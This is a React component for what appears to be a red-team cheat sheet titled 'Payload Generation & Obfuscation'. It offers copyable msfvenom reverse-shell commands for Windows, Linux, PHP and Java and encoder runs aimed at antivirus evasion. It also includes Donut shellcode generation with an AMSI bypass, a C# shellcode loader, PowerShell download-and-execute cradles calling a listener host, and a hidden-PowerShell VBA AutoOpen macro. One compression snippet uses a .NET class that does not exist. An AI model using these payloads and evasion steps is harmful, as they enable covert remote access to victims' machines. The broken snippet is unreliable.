import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaCode, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const PayloadGeneration = () => {
  const [expandedSection, setExpandedSection] = useState('msfvenom');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: 'Guided Payload Generation Walkthrough',
      content: [
        {
          type: 'markdown',
          value: 'Follow this step-by-step chain for generating and obfuscating payloads. Expand each step for details and commands.'
        },
        {
          type: 'step',
          title: '1. Generate a Basic Payload',
          description: 'Create a simple reverse shell payload for Windows or Linux.',
          commands: [
            { value: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe', description: 'Windows reverse shell' },
            { value: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf', description: 'Linux reverse shell' }
          ]
        },
        {
          type: 'step',
          title: '2. Obfuscate the Payload',
          description: 'Use encoders and custom templates to evade detection.',
          commands: [
            { value: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe', description: 'Encoded payload' },
            { value: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -x /path/to/legit.exe -f exe -o malicious.exe', description: 'Custom template payload' }
          ]
        },
        {
          type: 'step',
          title: '3. Generate Shellcode',
          description: 'Create shellcode from PE or .NET assemblies using Donut.',
          commands: [
            { value: 'donut -a 2 -b 1 -f 1 -o payload.bin shell.exe', description: 'Shellcode from PE' },
            { value: 'donut -a 2 -b 1 -f 7 -o payload.bin Rubeus.exe', description: 'Shellcode from .NET assembly' }
          ]
        },
        {
          type: 'step',
          title: '4. Advanced Obfuscation',
          description: 'Obfuscate PowerShell or macro payloads for evasion.',
          commands: [
            { value: '$cmd = "iex" + "(" + "New-Object Net.WebClient).DownloadString(\'http://10.0.0.1/script.ps1\')"', description: 'PowerShell string concatenation' },
            { value: 'Sub AutoOpen() ...', description: 'VBA macro loader' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** After each step, test your payloads in a safe environment and document your results!'
        }
      ]
    },
    {
      id: 'msfvenom',
      title: 'Msfvenom Payloads',
      content: [
        {
          type: 'markdown',
          value: `### Common Payloads
\`\`\`bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# PowerShell encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh -o shell.ps1
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Obfuscation Techniques
\`\`\`bash
# Encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Custom templates
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -x /path/to/legit.exe -f exe -o malicious.exe

# Anti-virus evasion
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -k --smallest -o stealth.exe
\`\`\``
        }
      ]
    },
    {
      id: 'donut',
      title: 'Donut & Shellcode',
      content: [
        {
          type: 'markdown',
          value: `### Donut Usage
\`\`\`bash
# Generate shellcode from PE
donut -a 2 -b 1 -f 1 -o payload.bin shell.exe

# Generate shellcode from .NET assembly
donut -a 2 -b 1 -f 7 -o payload.bin Rubeus.exe

# Parameters:
# -a: Architecture (1=x86, 2=x64, 3=both)
# -b: Bypass AMSI/WLDP (1=enable)
# -f: File type (1=EXE, 2=DLL, 3=NET EXE, etc.)
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Shellcode Execution
\`\`\`powershell
# PowerShell loader
[System.Reflection.Assembly]::Load([Convert]::FromBase64String("BASE64_SHELLCODE")).GetType("Class").GetMethod("Method").Invoke($null, $null)

# C# loader
byte[] buf = new byte[BUFFER_SIZE] { SHELLCODE_BYTES };
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000, 0x40);
Marshal.Copy(buf, 0, addr, buf.Length);
IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
\`\`\``
        }
      ]
    },
    {
      id: 'obfuscation',
      title: 'Advanced Obfuscation',
      content: [
        {
          type: 'markdown',
          value: `### PowerShell Obfuscation
\`\`\`powershell
# String concatenation
$cmd = "iex" + "(" + "New-Object Net.WebClient).DownloadString('http://10.0.0.1/script.ps1')"

# Encoding/compression
$compressed = [System.Convert]::ToBase64String([System.IO.Compression.Compression]::Compress([System.Text.Encoding]::UTF8.GetBytes($script)))
iex([System.Text.Encoding]::UTF8.GetString([System.IO.Compression.Compression]::Uncompress([System.Convert]::FromBase64String($compressed))))

# AST manipulation (using Out-EncodedCommand)
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded)))
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Macro Obfuscation
\`\`\`vba
Sub AutoOpen()
    Dim x As String
    x = "powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQA..."
    Dim y As Object
    Set y = CreateObject("WScript.Shell")
    y.Run x, 0, False
End Sub
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaCode /> Payload Generation & Obfuscation
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive guide to payload generation, shellcode creation, and advanced obfuscation
          techniques to bypass security controls. Covers msfvenom, Donut, and custom techniques.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'step') {
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header">
                            <strong>{item.title}</strong>
                          </div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button
                                    onClick={() => handleCopy(cmd.value)}
                                    className="copy-button small"
                                  >
                                    Copy
                                  </button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else if (item.type === 'command') {
                      return (
                        <div key={index} className="content-item">
                          <div className="command-item">
                            <div className="command-header">
                              <code>{item.value}</code>
                              <button
                                onClick={() => handleCopy(item.value)}
                                className="copy-button small"
                              >
                                Copy
                              </button>
                            </div>
                            <p className="command-description">{item.description}</p>
                          </div>
                        </div>
                      );
                    } else {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>
                              {item.value}
                            </ReactMarkdown>
                            <button
                              onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
                              className="copy-button"
                            >
                              Copy All
                            </button>
                          </div>
                        </div>
                      );
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default PayloadGeneration;